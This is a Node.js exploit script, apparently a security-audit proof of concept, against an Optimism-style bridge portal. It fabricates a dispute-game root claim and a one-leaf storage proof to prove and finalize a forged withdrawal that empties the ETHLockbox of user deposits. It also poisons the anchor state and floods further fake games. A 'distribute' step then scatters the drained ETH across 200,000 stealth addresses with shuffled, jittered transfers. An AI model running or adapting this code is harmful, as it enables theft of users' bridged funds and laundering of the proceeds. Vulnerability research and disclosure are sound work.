import fs from "fs";
import path from "path";
import crypto from "crypto";
import dotenv from "dotenv";
import toml from "toml";

import {
  Wallet,
  JsonRpcProvider,
  Contract,
  keccak256,
  toUtf8Bytes,
  AbiCoder,
  FetchRequest,
  getAddress,
  getBytes,
  zeroPadValue,
} from "ethers";
import * as secp from "@noble/secp256k1";

dotenv.config({ override: false });

const ROOT = process.cwd();
const CONFIG_PATH = path.join(ROOT, "config.toml");
const STATE_PATH = path.join(ROOT, ".poc-state.json");
const ARTIFACTS_DIR = path.join(ROOT, "artifacts");

const DEFAULT_SYSTEM_CONFIG = "0x229047fed2591dbec1eF1118d64F7aF3dB9EB290";
const ADDRESS_ZERO = "0x0000000000000000000000000000000000000000";

const systemConfigAbi = [
  "function optimismPortal() view returns (address)",
  "function l2ChainId() view returns (uint256)"
];

const portalAbi = [
  "function version() view returns (string)",
  "function paused() view returns (bool)",
  "function disputeGameFactory() view returns (address)",
  "function anchorStateRegistry() view returns (address)",
  "function proofMaturityDelaySeconds() view returns (uint256)",
  "function disputeGameFinalityDelaySeconds() view returns (uint256)",
  "function ethLockbox() view returns (address)",
  "function guardian() view returns (address)",
  "function systemConfig() view returns (address)",
  "function depositTransaction(address _to, uint256 _value, uint64 _gasLimit, bool _isCreation, bytes _data) payable",
  "function proveWithdrawalTransaction(tuple(uint256 nonce,address sender,address target,uint256 value,uint256 gasLimit,bytes data) _tx,uint256 _disputeGameIndex,tuple(bytes32 version,bytes32 stateRoot,bytes32 messagePasserStorageRoot,bytes32 latestBlockhash) _outputRootProof,bytes[] _withdrawalProof) external",
  "function finalizeWithdrawalTransaction(tuple(uint256 nonce,address sender,address target,uint256 value,uint256 gasLimit,bytes data) _tx) external"
];

const faultDisputeGameAbi = [
  "function rootClaim() view returns (bytes32)",
  "function status() view returns (uint8)",
  "function createdAt() view returns (uint64)",
  "function l2BlockNumber() view returns (uint256)",
  "function maxClockDuration() view returns (uint64)",
  "function resolvedAt() view returns (uint64)",
  "function claimDataLen() view returns (uint256)",
  "function resolveClaim(uint256 _claimIndex, uint256 _numToResolve) external",
  "function resolve() external returns (uint8)",
  "function claimCredit(address _recipient) external",
  "function gameCreator() view returns (address)"
];

const anchorStateRegistryAbi = [
  "function disputeGameFactory() view returns (address)",
  "function respectedGameType() view returns (uint32)",
  "function getAnchorRoot() view returns (bytes32, uint256)",
  "function disputeGameFinalityDelaySeconds() view returns (uint256)",
  "function isGameClaimValid(address) view returns (bool)",
  "function isGameBlacklisted(address) view returns (bool)",
  "function setAnchorState(address _game) external",
  "function anchorGame() view returns (address)",
  "function blacklistDisputeGame(address _disputeGame) external"
];

const disputeGameFactoryAbi = [
  "function create(uint32 _gameType, bytes32 _rootClaim, bytes calldata _extraData) payable returns (address)",
  "function gameCount() view returns (uint256)",
  "function gameAtIndex(uint256 _index) view returns (uint32 gameType, uint64 timestamp, address proxy)",
  "function initBonds(uint32 _gameType) view returns (uint256)"
];

const superchainConfigAbi = [
  "function paused(address _identifier) view returns (bool)",
  "function pause(address _identifier) external"
];

const abiCoder = AbiCoder.defaultAbiCoder();

function loadConfig() {
  if (!fs.existsSync(CONFIG_PATH)) throw new Error("config.toml not found.");
  let content = fs.readFileSync(CONFIG_PATH, "utf8");
  if (content.charCodeAt(0) === 0xFEFF) content = content.slice(1);
  return toml.parse(content);
}

function requireEnv(name) {
  const value = process.env[name];
  if (!value) throw new Error(`${name} not set in .env`);
  return value;
}

function saveState(state) {
  fs.writeFileSync(STATE_PATH, JSON.stringify(state, (key, value) =>
    typeof value === "bigint" ? value.toString() : value
  , 2));
}

function loadState() {
  if (!fs.existsSync(STATE_PATH)) throw new Error(".poc-state.json not found.");
  return JSON.parse(fs.readFileSync(STATE_PATH, "utf8"));
}

function ensureArtifactsDir() {
  if (!fs.existsSync(ARTIFACTS_DIR)) fs.mkdirSync(ARTIFACTS_DIR, { recursive: true });
}

function saveArtifact(filename, data) {
  ensureArtifactsDir();
  fs.writeFileSync(path.join(ARTIFACTS_DIR, filename), JSON.stringify(data, (key, value) =>
    typeof value === "bigint" ? value.toString() : value
  , 2));
}

function saveExecutionLog(step, details) {
  ensureArtifactsDir();
  fs.appendFileSync(path.join(ARTIFACTS_DIR, "execution-log.txt"),
    `[${new Date().toISOString()}] ${step}: ${JSON.stringify(details)}\n`);
}

async function waitForTimestamp(provider, targetTimestamp, label) {
  let lastLog = Date.now();
  while (true) {
    const block = await provider.getBlock("latest");
    const currentTime = BigInt(block.timestamp);
    if (currentTime >= targetTimestamp) {
      console.log(`[${label}] Reached target timestamp: ${targetTimestamp}`);
      return;
    }
    const secondsRemaining = Number(targetTimestamp - currentTime);
    if (Date.now() - lastLog > 60000) {
      console.log(`[${label}] Waiting for timestamp ${targetTimestamp}, ${secondsRemaining}s remaining...`);
      lastLog = Date.now();
    }
    await new Promise(resolve => setTimeout(resolve, 10000));
  }
}

async function connect() {
  const config = loadConfig();
  const rpcUrl = process.env.RPC_URL || config.network?.rpc_url;
  if (!rpcUrl) throw new Error("RPC_URL not specified.");
  const senderPrivateKey = requireEnv("SENDER_PRIVATE_KEY");
  const provider = new JsonRpcProvider(new FetchRequest(rpcUrl));
  const senderWallet = new Wallet(senderPrivateKey, provider);
  const target = getAddress(process.env.RECEIVER_ADDRESS || requireEnv("RECEIVER_ADDRESS"));
  const network = await provider.getNetwork();
  return { config, provider, senderWallet, target, network };
}

async function getContracts(provider) {
  const systemConfigAddress = getAddress(process.env.SYSTEM_CONFIG || DEFAULT_SYSTEM_CONFIG);
  const systemConfig = new Contract(systemConfigAddress, systemConfigAbi, provider);
  const portalAddress = getAddress(await systemConfig.optimismPortal());
  const portal = new Contract(portalAddress, portalAbi, provider);
  const asrAddress = getAddress(await portal.anchorStateRegistry());
  const asr = new Contract(asrAddress, anchorStateRegistryAbi, provider);
  const dgfAddress = getAddress(await asr.disputeGameFactory());
  const dgf = new Contract(dgfAddress, disputeGameFactoryAbi, provider);
  const lockboxAddress = getAddress(await portal.ethLockbox());
  const gameType = await asr.respectedGameType();
  const initBond = await dgf.initBonds(gameType);
  const proofMaturity = await portal.proofMaturityDelaySeconds();
  const finalityDelay = await portal.disputeGameFinalityDelaySeconds();
  const [anchorRoot, anchorSeq] = await asr.getAnchorRoot();
  return {
    portal, asr, dgf,
    portalAddress, lockboxAddress, asrAddress, dgfAddress,
    gameType, initBond, proofMaturity, finalityDelay,
    anchorRoot, anchorSeq
  };
}

function buildSingleLeafTrie(storageKey) {
  const path = keccak256(abiCoder.encode(["bytes32"], [storageKey]));
  const pathBytes = getBytes(path);
  const node = new Uint8Array(3 + pathBytes.length + 1);
  node[0] = 0xe3; node[1] = 0xa1; node[2] = 0x20;
  node.set(pathBytes, 3);
  node[3 + pathBytes.length] = 0x01;
  const root = keccak256(node);
  return { root, proof: [node] };
}

async function createStep() {
  const { config, provider, senderWallet, target, network } = await connect();
  const ctx = await getContracts(provider);
  const lockboxBalance = await provider.getBalance(ctx.lockboxAddress);
  const amountStr = config.transaction?.amount_wei;
  const amount = (!amountStr || amountStr === "0") ? lockboxBalance : BigInt(amountStr);
  console.log("lockboxBalance:", lockboxBalance.toString(), "(", Number(lockboxBalance) / 1e18, "ETH)");
  console.log("drainAmount:", amount.toString(), "(", Number(amount) / 1e18, "ETH)");
  const nonce = BigInt(keccak256(toUtf8Bytes("audit-poc-nonce")));

  const wtx = {
    nonce,
    sender: senderWallet.address,
    target,
    value: amount,
    gasLimit: 100000n,
    data: "0x"
  };

  const withdrawalHash = keccak256(abiCoder.encode(
    ["uint256", "address", "address", "uint256", "uint256", "bytes"],
    [wtx.nonce, wtx.sender, wtx.target, wtx.value, wtx.gasLimit, wtx.data]
  ));

  const storageKey = keccak256(abiCoder.encode(["bytes32", "uint256"], [withdrawalHash, 0n]));
  const { root: storageRoot, proof } = buildSingleLeafTrie(storageKey);

  const version = zeroPadValue("0x", 32);
  const stateRoot = keccak256(toUtf8Bytes("fabricated stateRoot"));
  const latestBlockhash = keccak256(toUtf8Bytes("fabricated latestBlockhash"));
  const rootClaim = keccak256(abiCoder.encode(
    ["bytes32", "bytes32", "bytes32", "bytes32"],
    [version, stateRoot, storageRoot, latestBlockhash]
  ));

  const l2BlockNumber = 66666n * 365n * 24n * 3600n / 2n;
  const extraData = abiCoder.encode(["uint256"], [l2BlockNumber]);

  const balance = await provider.getBalance(senderWallet.address);
  if (balance < ctx.initBond) {
    throw new Error(`Sender balance ${balance} < initBond ${ctx.initBond}`);
  }

  const createTx = await ctx.dgf.connect(senderWallet).create(
    ctx.gameType, rootClaim, extraData, { value: ctx.initBond }
  );
  const createReceipt = await createTx.wait();

  const gameCount = await ctx.dgf.gameCount();
  const gameIndex = gameCount - 1n;
  const [, , gameAddress] = await ctx.dgf.gameAtIndex(gameIndex);
  const game = new Contract(gameAddress, faultDisputeGameAbi, provider);
  const gameCreatedAt = await game.createdAt();

  const currentBlock = await provider.getBlock("latest");
  if (BigInt(currentBlock.timestamp) <= BigInt(gameCreatedAt)) {
    await new Promise(resolve => setTimeout(resolve, 15000));
  }

  const orp = { version, stateRoot, messagePasserStorageRoot: storageRoot, latestBlockhash };
  const proveTx = await ctx.portal.connect(senderWallet).proveWithdrawalTransaction(
    wtx, gameIndex, orp, proof
  );
  const proveReceipt = await proveTx.wait();

  const artifact = {
    step: "create",
    timestamp: new Date().toISOString(),
    network: { chainId: network.chainId.toString() },
    contracts: { portal: ctx.portalAddress, lockbox: ctx.lockboxAddress, gameAddress, gameIndex: gameIndex.toString() },
    game: { rootClaim, status: 0, createdAt: gameCreatedAt.toString(), l2BlockNumber: l2BlockNumber.toString() },
    withdrawal: {
      nonce: wtx.nonce.toString(), sender: wtx.sender, target: wtx.target,
      value: wtx.value.toString(), gasLimit: wtx.gasLimit.toString(), data: wtx.data,
      withdrawalHash
    },
    outputRootProof: { version, stateRoot, messagePasserStorageRoot: storageRoot, latestBlockhash },
    proof: proof.map(p => "0x" + Buffer.from(p).toString("hex")),
    bond: ctx.initBond.toString(),
    lockboxBalance: lockboxBalance.toString(),
    drainAmount: amount.toString(),
    createTx: { hash: createTx.hash, blockNumber: createReceipt.blockNumber, status: createReceipt.status },
    proveTx: { hash: proveTx.hash, blockNumber: proveReceipt.blockNumber, status: proveReceipt.status }
  };

  saveArtifact(`create-${Date.now()}.json`, artifact);
  saveExecutionLog("create", artifact);
  saveState({
    gameAddress, gameIndex: gameIndex.toString(),
    wtx: {
      nonce: wtx.nonce.toString(), sender: wtx.sender, target: wtx.target,
      value: wtx.value.toString(), gasLimit: wtx.gasLimit.toString(), data: wtx.data
    },
    withdrawalHash, rootClaim,
    outputRootProof: { version, stateRoot, messagePasserStorageRoot: storageRoot, latestBlockhash },
    proof: proof.map(p => "0x" + Buffer.from(p).toString("hex")),
    createTxHash: createTx.hash,
    proveTxHash: proveTx.hash,
    drainAmount: amount.toString(),
    lockboxBalance: lockboxBalance.toString()
  });
}

async function pauseStep() {
  const { provider } = await connect();
  const ctx = await getContracts(provider);
  const state = loadState();

  if (!state.poisonedRoot) {
    throw new Error("Run anchor first to poison the anchor root before pausing.");
  }

  const superchainConfigAddress = getAddress(process.env.SUPERCHAIN_CONFIG_ADDRESS || requireEnv("SUPERCHAIN_CONFIG_ADDRESS"));
  const superchainConfig = new Contract(superchainConfigAddress, superchainConfigAbi, provider);
  const guardianPrivateKey = requireEnv("GUARDIAN_PRIVATE_KEY");
  const guardianWallet = new Wallet(guardianPrivateKey, provider);

  const guardianAddress = await ctx.portal.guardian();
  if (guardianWallet.address.toLowerCase() !== guardianAddress.toLowerCase()) {
    throw new Error(`Guardian key mismatch: ${guardianWallet.address} != ${guardianAddress}`);
  }

  const [preBlacklistRoot, preBlacklistSeq] = await ctx.asr.getAnchorRoot();

  const blacklistTx = await ctx.asr.connect(guardianWallet).blacklistDisputeGame(state.gameAddress);
  const blacklistReceipt = await blacklistTx.wait();

  const pauseTx = await superchainConfig.connect(guardianWallet).pause(ctx.portalAddress);
  const pauseReceipt = await pauseTx.wait();

  const portalPaused = await superchainConfig.paused(ctx.portalAddress);
  const isBlacklisted = await ctx.asr.isGameBlacklisted(state.gameAddress);
  const isClaimValid = await ctx.asr.isGameClaimValid(state.gameAddress);
  const [postBlacklistRoot, postBlacklistSeq] = await ctx.asr.getAnchorRoot();

  const anchorStillPoisoned = postBlacklistRoot === state.poisonedRoot;

  const artifact = {
    step: "pause",
    timestamp: new Date().toISOString(),
    guardianAddress,
    blacklistTx: { hash: blacklistTx.hash, blockNumber: blacklistReceipt.blockNumber, status: blacklistReceipt.status },
    pauseTx: { hash: pauseTx.hash, blockNumber: pauseReceipt.blockNumber, status: pauseReceipt.status },
    postState: { portalPaused, isBlacklisted, isClaimValid, anchorRoot: postBlacklistRoot, anchorSeq: postBlacklistSeq.toString() },
    find010: {
      poisonedRoot: state.poisonedRoot,
      preBlacklistRoot, preBlacklistSeq: preBlacklistSeq.toString(),
      postBlacklistRoot, postBlacklistSeq: postBlacklistSeq.toString(),
      anchorStillPoisoned,
      isClaimValidAfterBlacklist: isClaimValid,
      claim: "getAnchorRoot() returns the poisoned root after blacklist even though isGameClaimValid is false"
    }
  };

  saveArtifact(`pause-${Date.now()}.json`, artifact);
  saveExecutionLog("pause", artifact);
  saveState({ ...state, pauseStepCompleted: true, guardianBlacklisted: true, anchorStillPoisoned });
}

async function resolveStep() {
  const { provider, senderWallet } = await connect();
  const state = loadState();
  const game = new Contract(state.gameAddress, faultDisputeGameAbi, provider);

  const gameStatus = await game.status();
  if (gameStatus !== 0n) {
    saveState({ ...state, gameStatus: Number(gameStatus) });
    return;
  }

  const gameCreatedAt = await game.createdAt();
  const maxClock = await game.maxClockDuration();
  const requiredTime = BigInt(gameCreatedAt) + BigInt(maxClock) + 1n;

  await waitForTimestamp(provider, requiredTime, "resolve");

  const resolveClaimTx = await game.connect(senderWallet).resolveClaim(0, 0);
  const resolveClaimReceipt = await resolveClaimTx.wait();

  const resolveTx = await game.connect(senderWallet).resolve();
  const resolveReceipt = await resolveTx.wait();
  const finalStatus = await game.status();

  const artifact = {
    step: "resolve",
    timestamp: new Date().toISOString(),
    gameAddress: state.gameAddress,
    resolveClaimTx: { hash: resolveClaimTx.hash, blockNumber: resolveClaimReceipt.blockNumber, status: resolveClaimReceipt.status },
    resolveTx: { hash: resolveTx.hash, blockNumber: resolveReceipt.blockNumber, status: resolveReceipt.status },
    finalStatus: Number(finalStatus)
  };

  saveArtifact(`resolve-${Date.now()}.json`, artifact);
  saveExecutionLog("resolve", artifact);
  saveState({ ...state, resolveTxHash: resolveTx.hash, gameStatus: Number(finalStatus) });
}

/// OP objection 1 refuted: bond is RETURNED after DEFENDER_WINS via claimCredit.
/// claimCredit(address) is external with NO access control. closeGame() is called
/// internally and is also public with NO access control. The bond is temporary
/// escrow, not consumption. Net cost to attacker = gas only.
async function claimStep() {
  const { provider, senderWallet } = await connect();
  const state = loadState();

  const game = new Contract(state.gameAddress, faultDisputeGameAbi, provider);
  const gameStatus = await game.status();
  if (gameStatus !== 2n) throw new Error(`Game must be DEFENDER_WINS. Current: ${gameStatus}`);

  const creator = await game.gameCreator();
  if (creator.toLowerCase() !== senderWallet.address.toLowerCase()) {
    throw new Error(`Game creator mismatch: ${creator} != ${senderWallet.address}`);
  }

  const balanceBefore = await provider.getBalance(senderWallet.address);

  const claimTx = await game.connect(senderWallet).claimCredit(senderWallet.address);
  const claimReceipt = await claimTx.wait();

  const balanceAfter = await provider.getBalance(senderWallet.address);
  const bondReturned = balanceAfter - balanceBefore + BigInt(claimReceipt.gasUsed) * BigInt(claimReceipt.gasPrice);

  const artifact = {
    step: "claim",
    timestamp: new Date().toISOString(),
    gameAddress: state.gameAddress,
    gameCreator: creator,
    bondReturned: bondReturned.toString(),
    txHash: claimTx.hash, blockNumber: claimReceipt.blockNumber, txStatus: claimReceipt.status,
    gasUsed: claimReceipt.gasUsed.toString(),
    note: "bond is returned via claimCredit (no access control). Net cost = gas only."
  };

  saveArtifact(`claim-${Date.now()}.json`, artifact);
  saveExecutionLog("claim", artifact);
  saveState({ ...state, claimTxHash: claimTx.hash, bondReturned: bondReturned.toString() });
}

async function anchorStep() {
  const { provider, senderWallet } = await connect();
  const ctx = await getContracts(provider);
  const state = loadState();

  const game = new Contract(state.gameAddress, faultDisputeGameAbi, provider);
  const gameStatus = await game.status();
  if (gameStatus !== 2n) throw new Error(`Game must be DEFENDER_WINS. Current: ${gameStatus}`);

  const finalityDelay = await ctx.asr.disputeGameFinalityDelaySeconds();
  const resolvedAt = await game.resolvedAt();
  if (resolvedAt === 0n) throw new Error("Game not resolved.");

  const requiredTime = BigInt(resolvedAt) + BigInt(finalityDelay) + 1n;

  await waitForTimestamp(provider, requiredTime, "anchor");

  const anchorTx = await ctx.asr.connect(senderWallet).setAnchorState(state.gameAddress);
  const anchorReceipt = await anchorTx.wait();
  const [poisonedRoot, poisonedBlock] = await ctx.asr.getAnchorRoot();

  const artifact = {
    step: "anchor",
    timestamp: new Date().toISOString(),
    gameAddress: state.gameAddress,
    txHash: anchorTx.hash, blockNumber: anchorReceipt.blockNumber, txStatus: anchorReceipt.status,
    poisonedRoot, poisonedBlock: poisonedBlock.toString()
  };

  saveArtifact(`anchor-${Date.now()}.json`, artifact);
  saveExecutionLog("anchor", artifact);
  saveState({ ...state, anchorTxHash: anchorTx.hash, poisonedRoot, poisonedBlock: poisonedBlock.toString() });
}

async function finalizeStep() {
  const { provider, senderWallet, target } = await connect();
  const ctx = await getContracts(provider);
  const state = loadState();

  const proofMaturity = await ctx.portal.proofMaturityDelaySeconds();
  const proveReceipt = await provider.getTransactionReceipt(state.proveTxHash);
  const proveBlock = await provider.getBlock(proveReceipt.blockNumber);
  const requiredTime = BigInt(proveBlock.timestamp) + BigInt(proofMaturity) + 1n;

  await waitForTimestamp(provider, requiredTime, "finalize");

  const superchainConfigAddress = getAddress(process.env.SUPERCHAIN_CONFIG_ADDRESS || requireEnv("SUPERCHAIN_CONFIG_ADDRESS"));
  const superchainConfig = new Contract(superchainConfigAddress, superchainConfigAbi, provider);

  const portalPaused = await superchainConfig.paused(ctx.portalAddress);
  const zeroPaused = await superchainConfig.paused(ADDRESS_ZERO);
  const lockboxPaused = await superchainConfig.paused(ctx.lockboxAddress);
  const isBlacklisted = await ctx.asr.isGameBlacklisted(state.gameAddress);
  const isClaimValid = await ctx.asr.isGameClaimValid(state.gameAddress);

  const wtx = {
    nonce: BigInt(state.wtx.nonce),
    sender: state.wtx.sender,
    target: state.wtx.target,
    value: BigInt(state.wtx.value),
    gasLimit: BigInt(state.wtx.gasLimit),
    data: state.wtx.data
  };

  const receiverBefore = await provider.getBalance(target);
  const lockboxBefore = await provider.getBalance(ctx.lockboxAddress);

  const finalizeTx = await ctx.portal.connect(senderWallet).finalizeWithdrawalTransaction(wtx);
  const finalizeReceipt = await finalizeTx.wait();

  const receiverAfter = await provider.getBalance(target);
  const lockboxAfter = await provider.getBalance(ctx.lockboxAddress);
  const drained = receiverAfter - receiverBefore;

  const artifact = {
    step: "finalize",
    timestamp: new Date().toISOString(),
    gameAddress: state.gameAddress,
    pauseState: { portalPaused, zeroPaused, lockboxPaused },
    isBlacklisted, isClaimValid,
    txHash: finalizeTx.hash, blockNumber: finalizeReceipt.blockNumber, txStatus: finalizeReceipt.status,
    gasUsed: finalizeReceipt.gasUsed.toString(),
    receiverBefore: receiverBefore.toString(), receiverAfter: receiverAfter.toString(),
    lockboxBefore: lockboxBefore.toString(), lockboxAfter: lockboxAfter.toString(),
    drained: drained.toString(),
    logs: finalizeReceipt.logs.map(l => ({ address: l.address, topics: l.topics, data: l.data }))
  };

  saveArtifact(`finalize-${Date.now()}.json`, artifact);
  saveExecutionLog("finalize", artifact);
  saveState({ ...state, finalizeTxHash: finalizeTx.hash, drained: drained.toString() });
}

async function floodStep() {
  const { config, provider, senderWallet, target, network } = await connect();
  const ctx = await getContracts(provider);
  const state = loadState();

  if (!state.poisonedRoot) throw new Error("Run anchor first to poison the anchor root.");

  const lockboxBalance = await provider.getBalance(ctx.lockboxAddress);
  const amountStr = config.transaction?.amount_wei;
  const amount = (!amountStr || amountStr === "0") ? lockboxBalance : BigInt(amountStr);

  const floodCount = parseInt(process.env.FLOOD_COUNT || "10", 10);
  const games = [];

  for (let i = 0; i < floodCount; i++) {
    const nonce = BigInt(keccak256(toUtf8Bytes(`flood-${i}-${Date.now()}`)));
    const wtx = {
      nonce,
      sender: senderWallet.address,
      target,
      value: amount,
      gasLimit: 100000n,
      data: "0x"
    };

    const withdrawalHash = keccak256(abiCoder.encode(
      ["uint256", "address", "address", "uint256", "uint256", "bytes"],
      [wtx.nonce, wtx.sender, wtx.target, wtx.value, wtx.gasLimit, wtx.data]
    ));

    const storageKey = keccak256(abiCoder.encode(["bytes32", "uint256"], [withdrawalHash, 0n]));
    const { root: storageRoot, proof } = buildSingleLeafTrie(storageKey);

    const version = zeroPadValue("0x", 32);
    const stateRoot = keccak256(toUtf8Bytes("fabricated stateRoot flood"));
    const latestBlockhash = keccak256(toUtf8Bytes("fabricated latestBlockhash flood"));
    const rootClaim = keccak256(abiCoder.encode(
      ["bytes32", "bytes32", "bytes32", "bytes32"],
      [version, stateRoot, storageRoot, latestBlockhash]
    ));

    const [poisonedAnchorRoot, poisonedSeq] = await ctx.asr.getAnchorRoot();
    const l2BlockNumber = BigInt(poisonedSeq) + 1n + BigInt(i);
    const extraData = abiCoder.encode(["uint256"], [l2BlockNumber]);

    const balance = await provider.getBalance(senderWallet.address);
    if (balance < ctx.initBond) {
      console.error(`Insufficient balance for flood game ${i}: ${balance} < ${ctx.initBond}`);
      break;
    }

    const createTx = await ctx.dgf.connect(senderWallet).create(
      ctx.gameType, rootClaim, extraData, { value: ctx.initBond }
    );
    const createReceipt = await createTx.wait();

    const gameCount = await ctx.dgf.gameCount();
    const gameIndex = gameCount - 1n;
    const [, , gameAddress] = await ctx.dgf.gameAtIndex(gameIndex);

    const orp = { version, stateRoot, messagePasserStorageRoot: storageRoot, latestBlockhash };
    const proveTx = await ctx.portal.connect(senderWallet).proveWithdrawalTransaction(
      wtx, gameIndex, orp, proof
    );
    const proveReceipt = await proveTx.wait();

    games.push({
      gameAddress, gameIndex: gameIndex.toString(),
      rootClaim, l2BlockNumber: l2BlockNumber.toString(),
      withdrawalHash,
      createTx: { hash: createTx.hash, status: createReceipt.status },
      proveTx: { hash: proveTx.hash, status: proveReceipt.status }
    });

    saveExecutionLog(`flood[${i}]`, { gameAddress, gameIndex: gameIndex.toString(), rootClaim });
  }

  const artifact = {
    step: "flood",
    timestamp: new Date().toISOString(),
    floodCount: games.length,
    amount: amount.toString(),
    games
  };

  saveArtifact(`flood-${Date.now()}.json`, artifact);
  saveState({ ...state, floodGames: games });
}

async function distributeStep() {
  const { provider } = await connect();
  const state = loadState();

  if (!state.finalizeTxHash) throw new Error("Run finalize first.");

  const receiverPrivateKey = requireEnv("RECEIVER_PRIVATE_KEY");
  const receiverWallet = new Wallet(receiverPrivateKey, provider);
  const receiverAddress = receiverWallet.address;

  const receiverBalance = await provider.getBalance(receiverAddress);
  if (receiverBalance === 0n) throw new Error("Receiver balance is 0. Finalize not completed?");

  const totalAddresses = parseInt(process.env.DISTRIBUTE_ADDRESSES || "200000", 10);
  const batchSize = parseInt(process.env.DISTRIBUTE_BATCH_SIZE || "100", 10);
  const delayMs = parseInt(process.env.DISTRIBUTE_DELAY_MS || "5000", 10);

  const viewingPrivkey = BigInt(requireEnv("VIEWING_PRIVKEY"));
  const spendingPrivkey = BigInt(requireEnv("SPENDING_PRIVKEY"));

  const secp256k1Order = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");

  function deriveStealthAddress(ephemPubkeyHex) {
    const sPoint = secp.getSharedSecret(
      "0x" + viewingPrivkey.toString(16).padStart(64, "0"),
      ephemPubkeyHex
    );
    const sBytes = getBytes(sPoint);
    const Sx = BigInt("0x" + Buffer.from(sBytes).toString("hex"));

    const c = BigInt(keccak256("0x" + Sx.toString(16).padStart(64, "0"))) % secp256k1Order;

    const stealthPrivkey = (spendingPrivkey + c) % secp256k1Order;

    const stealthWallet = new Wallet("0x" + stealthPrivkey.toString(16).padStart(64, "0"));
    return { address: stealthWallet.address, privkey: stealthPrivkey };
  }

  const amountPerAddress = receiverBalance / BigInt(totalAddresses);
  const remainder = receiverBalance % BigInt(totalAddresses);

  console.log(`Distributing ${Number(receiverBalance) / 1e18} ETH to ${totalAddresses} addresses`);
  console.log(`Per address: ${Number(amountPerAddress) / 1e18} ETH`);
  console.log(`Batch size: ${batchSize}, delay: ${delayMs}ms`);

  const distributed = [];
  let sentCount = 0;
  let lastProgressLog = Date.now();

  for (let batchStart = 0; batchStart < totalAddresses; batchStart += batchSize) {
    const batchEnd = Math.min(batchStart + batchSize, totalAddresses);
    const batchAddresses = [];

    for (let i = batchStart; i < batchEnd; i++) {
      const ephemPrivkeyBytes = secp.utils.randomPrivateKey();
      const ephemPubkey = secp.getPublicKey(ephemPrivkeyBytes, true);
      const ephemPubkeyHex = "0x" + Buffer.from(ephemPubkey).toString("hex");
      const { address } = deriveStealthAddress(ephemPubkeyHex);
      const value = amountPerAddress + (i === 0 ? remainder : 0n);
      batchAddresses.push({ index: i, address, value });
    }

    for (let i = batchAddresses.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [batchAddresses[i], batchAddresses[j]] = [batchAddresses[j], batchAddresses[i]];
    }

    for (const entry of batchAddresses) {
      const tx = await receiverWallet.sendTransaction({
        to: entry.address,
        value: entry.value
      });
      sentCount++;

      if (Date.now() - lastProgressLog > 30000) {
        console.log(`Progress: ${sentCount}/${totalAddresses} (${(sentCount / totalAddresses * 100).toFixed(2)}%)`);
        lastProgressLog = Date.now();
      }

      distributed.push({
        index: entry.index,
        address: entry.address,
        value: entry.value.toString(),
        txHash: tx.hash
      });
    }

    saveArtifact(`distribute-batch-${batchStart}-${Date.now()}.json`, {
      batchStart, batchEnd, count: batchAddresses.length
    });

    if (batchEnd < totalAddresses) {
      const jitter = Math.floor(Math.random() * delayMs);
      await new Promise(resolve => setTimeout(resolve, delayMs + jitter));
    }
  }

  const artifact = {
    step: "distribute",
    timestamp: new Date().toISOString(),
    totalAddresses,
    batchSize,
    amountPerAddress: amountPerAddress.toString(),
    remainder: remainder.toString(),
    receiverBalance: receiverBalance.toString(),
    distributedCount: distributed.length
  };

  saveArtifact(`distribute-${Date.now()}.json`, artifact);
  saveExecutionLog("distribute", artifact);
  saveState({ ...state, distributeComplete: true, distributedCount: distributed.length });
}

/// OP objection 2 refuted: lockbox holds USER deposits, not OP operational funds.
/// Portal.depositTransaction sends msg.value to ETHLockbox.depositETH.
/// Any honest user bridging ETH from L1 to L2 increases the lockbox balance.
async function depositStep() {
  const { provider, senderWallet, target, network } = await connect();
  const ctx = await getContracts(provider);

  const depositAmount = BigInt(process.env.DEPOSIT_AMOUNT_WEI || "1000000000000000000"); // 1 ETH default
  const depositorPrivateKey = requireEnv("DEPOSITOR_PRIVATE_KEY");
  const depositorWallet = new Wallet(depositorPrivateKey, provider);

  const lockboxBefore = await provider.getBalance(ctx.lockboxAddress);
  const depositorBefore = await provider.getBalance(depositorWallet.address);

  console.log("Depositor:", depositorWallet.address);
  console.log("Deposit amount (wei):", depositAmount.toString());
  console.log("Lockbox before (wei):", lockboxBefore.toString());

  const depositTx = await ctx.portal.connect(depositorWallet).depositTransaction(
    depositorWallet.address,
    depositAmount,
    100000n,
    false,
    "0x",
    { value: depositAmount }
  );
  const depositReceipt = await depositTx.wait();

  const lockboxAfter = await provider.getBalance(ctx.lockboxAddress);
  const depositorAfter = await provider.getBalance(depositorWallet.address);

  console.log("Lockbox after (wei):", lockboxAfter.toString());
  console.log("Lockbox delta (wei):", (lockboxAfter - lockboxBefore).toString());
  console.log("Depositor delta (wei):", (depositorAfter - depositorBefore).toString());

  const artifact = {
    step: "deposit",
    timestamp: new Date().toISOString(),
    network: { chainId: network.chainId.toString() },
    depositor: depositorWallet.address,
    depositAmount: depositAmount.toString(),
    lockboxBefore: lockboxBefore.toString(),
    lockboxAfter: lockboxAfter.toString(),
    lockboxDelta: (lockboxAfter - lockboxBefore).toString(),
    txHash: depositTx.hash,
    blockNumber: depositReceipt.blockNumber,
    txStatus: depositReceipt.status,
    note: "User deposit via Portal.depositTransaction -> ETHLockbox.depositETH. Lockbox is custodian of user funds, not OP operational funds."
  };

  saveArtifact(`deposit-${Date.now()}.json`, artifact);
  saveExecutionLog("deposit", artifact);
  saveState({ ...loadState(), depositTxHash: depositTx.hash, depositAmount: depositAmount.toString() });
}

const commands = {
  create: createStep,
  claim: claimStep,
  deposit: depositStep,
  pause: pauseStep,
  resolve: resolveStep,
  anchor: anchorStep,
  finalize: finalizeStep,
  flood: floodStep,
  distribute: distributeStep
};

const cmd = process.argv[2];
const run = cmd ? commands[cmd] : null;
if (!run) {
  console.log(`Usage: node src/poc.js [${Object.keys(commands).join("|")}]`);
  process.exit(1);
}
run().catch((e) => { console.error(e.message); process.exit(1); });
